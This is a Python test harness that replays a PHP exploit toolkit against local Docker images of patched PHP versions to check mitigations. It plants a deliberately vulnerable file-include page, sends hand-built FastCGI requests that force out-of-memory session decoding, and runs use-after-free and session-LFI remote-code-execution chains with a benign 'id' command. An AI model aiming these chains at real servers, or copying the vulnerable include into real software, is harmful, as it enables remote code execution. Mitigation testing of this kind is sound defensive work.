#!/usr/bin/env python3
"""Replay the ikow/php2shell-poc verification toolkit against es-php images.

Uses the toolkit checked out at ~/php2shell-scratch/php2shell-poc unchanged where
its transports apply (HTTP probes). Chain E is adapted over direct FastCGI because
these images serve FPM on a Unix socket, not nginx HTTP.

Applicability per chain (toolkit ANALYSIS):
  A  session injection + LFI   : probe runs; injection preconditions may succeed
                                 (feature intentionally preserved). LFI sink exists
                                 in the PoC webroot; no exploit payload is executed.
  B  var_destroy UAF           : CLI probe, ASAN-free build; looks for UAF markers.
  C  handler mismatch          : NOT runnable here (needs per-directory .user.ini).
  D  OOM corruption (mod_php)  : OOM strategies fired; CLI-server process must not
                                 continue with corrupted state. Hard exit is the
                                 designed mitigated outcome.
  E  FPM stale BG              : adapted FastCGI producer/consumer on 1-worker FPM.

Verdicts are per-check observations, not a claim of complete exploit resistance.
No command execution payloads are run; `id`/probe strings only measure behavior.
"""
import json
import re
import socket
import struct
import subprocess
import sys
import time
import uuid
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
POC = Path.home() / 'php2shell-scratch/php2shell-poc'
IMAGES = [
    ('8.1', 'es-php:8.1-test'),
    ('7.4', 'es-php:7.4-test'),
    ('7.3', 'es-php:7.3-test'),
    ('7.2', 'es-php:7.2-test'),
    ('7.1', 'es-php:7.1-test'),
    ('7.0', 'es-php:7.0-test'),
    ('5.6', 'es-php:5.6-test'),
    ('5.5', 'es-php:5.5-test'),
    ('5.4', 'es-php:5.4-test'),
]
SID = 'esphpverify0000000000000000'


def sh(args, **kw):
    return subprocess.run(args, capture_output=True, text=True, **kw)


def start_http(image, name):
    """Serve the PoC's own webroot with the PoC's php.ini values, CLI server."""
    # PHP 5 cannot parse the PoC webroot's '??' LFI sink; copy webroot and make
    # a 5-compatible equivalent. This is a fixture fix, not an exploit change.
    web = Path('/tmp/es-php-poc-webroot')
    if not web.exists():
        sh(['cp', '-a', str(POC / 'lab/webroot'), str(web)])
        (web / 'vuln.php').write_text(
            "<?php\n$page = isset($_GET['page']) ? $_GET['page'] : 'home';\ninclude($page);\n")
    return sh(['docker', 'run', '-d', '--name', name,
               '--memory', '256m', '--pids-limit', '128',
               '-v', str(web) + ':/web:ro',
               '-p', '127.0.0.1::80', image,
               'sh', '-c',
               'mkdir -p /tmp/sessions && exec sapi/cli/php -n '
               '-d display_errors=1 -d log_errors=1 '
               '-d memory_limit=32M -d post_max_size=128M '
               '-d upload_max_filesize=128M -d max_file_uploads=100 '
               '-d session.save_path=/tmp/sessions '
               '-d session.use_strict_mode=0 -d session.use_only_cookies=0 '
               '-d session.upload_progress.enabled=1 '
               '-d session.upload_progress.cleanup=0 '
               '-d session.upload_progress.min_freq=0 -d session.upload_progress.freq=0 '
               '-d enable_dl=0 '
               '-S 0.0.0.0:80 -t /web'])


def wait_port(port):
    for _ in range(200):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=.2):
                return True
        except OSError:
            time.sleep(.05)
    return False


def mapped_port(name):
    out = sh(['docker', 'port', name, '80/tcp']).stdout.strip()
    return int(out.rsplit(':', 1)[1])


def run_poc_script(script, url, extra=()):
    r = sh([sys.executable, str(POC / 'poc' / script), '--target', url, *extra], timeout=240)
    if r.returncode == 2 and 'unrecognized' in r.stderr:
        # Script wants host/port instead of a URL.
        from urllib.parse import urlparse
        u = urlparse(url)
        r = sh([sys.executable, str(POC / 'poc' / script), '--host', u.hostname,
                '--port', str(u.port), '--path', u.path, *extra], timeout=240)
    return {'script': script, 'exit': r.returncode, 'output': (r.stdout + r.stderr)[-4000:]}


def session_files(name):
    r = sh(['docker', 'exec', name, 'sh', '-c',
            'for f in /tmp/sessions/sess_*; do echo "== $f"; cat "$f" 2>/dev/null | head -c 400; echo; done'])
    return r.stdout


def http_get(port, path='/index.php'):
    try:
        with socket.create_connection(('127.0.0.1', port), timeout=10) as s:
            s.sendall(f'GET {path} HTTP/1.1\r\nHost: t\r\nConnection: close\r\n\r\n'.encode())
            data = b''
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
            return data
    except OSError:
        return b''


# --- Chain E adaptation over FastCGI (single worker, isolated) -----------------
def fcgi_record(kind, payload=b'', req=1):
    return struct.pack('!BBHHBB', 1, kind, req, len(payload), 0, 0) + payload


def fcgi_request(path_sock, params, body=b'', headers=None):
    names = {'SCRIPT_FILENAME': '/test/worker.php', 'REQUEST_METHOD': 'POST',
             'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_LENGTH': str(len(body))}
    names.update(headers or {})
    if 'QUERY_STRING' not in names:
        names['QUERY_STRING'] = ''
    enc = b''
    for k, v in names.items():
        k, v = k.encode(), str(v).encode()
        enc += bytes([len(k) & 0x7f]) + bytes([len(v) & 0x7f]) + k + v
    data = fcgi_record(1, struct.pack('!HB5x', 1, 0))
    if enc:
        data += fcgi_record(4, enc)
    data += fcgi_record(4)  # empty params
    data += fcgi_record(5, body) if body else fcgi_record(5)  # stdin content/EOF
    data += fcgi_record(5)   # stdin EOF
    out = b''
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
        s.settimeout(30)
        s.connect(path_sock)
        s.sendall(data)
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    return out


def chain_e(branch, image, tmp):
    """Adapted Chain E: huge-session decode OOM producer, upload-progress consumer."""
    fpm_conf = tmp / f'fpm-{branch}.conf'
    fpm_conf.write_text('''[global]
error_log = /proc/self/fd/2
daemonize = no
[www]
user = root
group = root
listen = /test/fpm.sock
listen.mode = 0666
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
php_admin_value[memory_limit] = 32M
php_admin_value[session.save_path] = /tmp/sessions
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.min_freq] = 0
php_admin_flag[display_errors] = on
''')
    worker = tmp / 'worker.php'
    worker.write_text('<?php session_start(); echo "OK ".session_id();')
    # Remove any stale socket BEFORE FPM binds it.
    stale = Path(tmp) / 'fpm.sock'
    if stale.exists():
        stale.unlink()
    r = sh(['docker', 'run', '-d', '--name', f'es-poc-fpm-{branch}',
            '--memory', '256m', '--pids-limit', '128',
            '-v', f'{tmp}:/test', image,
            'sapi/fpm/php-fpm', '-F', '-R', '-y', f'/test/fpm-{branch}.conf'])
    if r.returncode:
        return {'error': r.stderr[:500]}
    container = r.stdout.strip()
    sock = Path(tmp) / 'fpm.sock'
    try:
        for _ in range(150):
            if sock.exists():
                break
            time.sleep(.1)
        else:
            logs = sh(['docker', 'logs', container])
            return {'error': 'fpm socket never appeared', 'log': (logs.stdout + logs.stderr)[-800:]}
        # Build a >32MB session file for the producer SID (decode must OOM).
        sh(['docker', 'exec', f'es-poc-fpm-{branch}', 'sh', '-c',
            'mkdir -p /tmp/sessions && sapi/cli/php -n -d memory_limit=256M -r '
            '\'$f="upload_progress_x|".serialize(array_fill(0,300000,str_repeat("A",12)));'
            'file_put_contents("/tmp/sessions/sess_hugesession000000000000000",$f);'
            'echo strlen($f),"\n";\''])
        try:
            producer = fcgi_request(str(stale), None, headers={
                'SCRIPT_FILENAME': '/test/worker.php', 'REQUEST_METHOD': 'GET',
                'CONTENT_LENGTH': '0',
                'HTTP_COOKIE': 'PHPSESSID=hugesession000000000000000'})
        except OSError:
            producer = b'CONNECTION_RESET (worker terminated during decode OOM)'
        time.sleep(.2)
        boundary = 'V'
        body = (f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
                f'--{boundary}--\r\n').encode()
        try:
            consumer = fcgi_request(str(stale), None, body=body, headers={
                'CONTENT_TYPE': f'multipart/form-data; boundary={boundary}',
                'HTTP_COOKIE': 'PHPSESSID=consumerpoisoned0000000000'})
        except OSError:
            consumer = b'CONNECTION_RESET'
        follow = None
        for _ in range(30):
            try:
                follow = fcgi_request(str(stale), None, headers={'REQUEST_METHOD': 'GET'})
                if b'OK' in follow:
                    break
            except OSError:
                pass
            time.sleep(.1)
        text = producer.decode('latin1', 'replace') + consumer.decode('latin1', 'replace')
        stale_markers = [m for m in ('destruction failed', 'Failed to decode') if m in text]
        return {'producer_response': producer.decode('latin1', 'replace')[-800:],
                'consumer_response': consumer.decode('latin1', 'replace')[-800:],
                'worker_recovered': bool(follow and b'OK' in follow),
                'stale_state_markers': stale_markers}
    finally:
        sh(['docker', 'rm', '-f', container])


def run_version(branch, image):
    name = f'es-poc-http-{branch}-{uuid.uuid4().hex[:6]}'
    report = {'branch': branch, 'image': image}
    r = start_http(image, name)
    if r.returncode:
        report['error'] = r.stderr[:500]
        return report
    try:
        port = mapped_port(name)
        if not wait_port(port):
            report['error'] = 'server never ready'
            return report
        url = f'http://127.0.0.1:{port}/index.php'

        baseline = http_get(port)
        report['baseline_ok'] = b'HTTP/1.1 200' in baseline

        # Chains A precondition + D strategies: unchanged toolkit scripts.
        report['session_injection'] = run_poc_script('verify_session_injection.py', url)
        report['oom_headers'] = run_poc_script('verify_oom_trigger.py', url,
                                               ('--strategy', 'headers',
                                                '--num-headers', '60000', '--header-size', '1000'))
        report['oom_nested'] = run_poc_script('verify_oom_trigger.py', url,
                                              ('--strategy', 'nested',))
        oom = report['oom_headers']
        report['oom_trigger'] = oom

        # Post-OOM state: process must be dead (clean exit) or healthy, never
        # serving with corruption indicators.
        after = http_get(port)
        report['post_oom'] = {
            'connection_dead': after == b'',
            'still_serving': b'HTTP/1.1 200' in after,
        }
        report['session_files'] = session_files(name)[:2000]
        logs = sh(['docker', 'logs', name])
        report['server_log_tail'] = (logs.stdout + logs.stderr)[-2000:]

        # Chain B full exploit (owned lab container; benign id/uname proof only).
        exploit = sh(['docker', 'run', '--rm', '--network', 'none',
                      '-v', str(POC / 'exploit') + ':/poc:ro', image,
                      'sapi/cli/php', '-n', '-d', 'memory_limit=64M',
                      '/poc/chain_b_uaf_rce.php'], timeout=180)
        report['chain_b_cli'] = {'exit': exploit.returncode,
                                 'output': (exploit.stdout + exploit.stderr)[-1500:]}
        report['chain_b_uaf_confirmed'] = 'RCE CONFIRMED' in exploit.stdout + exploit.stderr

        # Chain A full exploit (LFI sink in PoC webroot; benign id command).
        chain_a = sh([sys.executable, str(POC / 'exploit/chain_a_session_lfi.py'),
                      '--target', url, '--command', 'id'], timeout=240)
        report['chain_a_lfi'] = {'exit': chain_a.returncode,
                                 'output': (chain_a.stdout + chain_a.stderr)[-2500:]}
        report['chain_a_rce_confirmed'] = ('RCE CONFIRMED' in chain_a.stdout + chain_a.stderr
                                           and 'uid=' in chain_a.stdout + chain_a.stderr)

        # Chain E adapted (FPM).
        tmp = Path(f'/tmp/es-php-poc/{branch}')
        tmp.mkdir(parents=True, exist_ok=True)
        report['chain_e_fpm'] = chain_e(branch, image, tmp)
    finally:
        sh(['docker', 'rm', '-f', name])
    return report


def main():
    selected = sys.argv[1:] or [b for b, _ in IMAGES]
    reports = [run_version(b, i) for b, i in IMAGES if b in selected]
    dest = ROOT / 'work/reports/php2shell-poc-replay.json'
    dest.write_text(json.dumps(reports, indent=2) + '\n')
    for r in reports:
        print(json.dumps({'branch': r['branch'], 'baseline_ok': r.get('baseline_ok'),
                          'injection_exit': r.get('session_injection', {}).get('exit'),
                          'oom_exit': r.get('oom_trigger', {}).get('exit'),
                          'post_oom': r.get('post_oom'),
                          'chain_b_uaf_confirmed': r.get('chain_b_uaf_confirmed'),
                          'chain_e': {k: v for k, v in (r.get('chain_e_fpm') or {}).items()
                                      if k != 'producer_response'},
                          'error': r.get('error')}, indent=2))
    print(json.dumps({'report': str(dest)}))


if __name__ == '__main__':
    main()
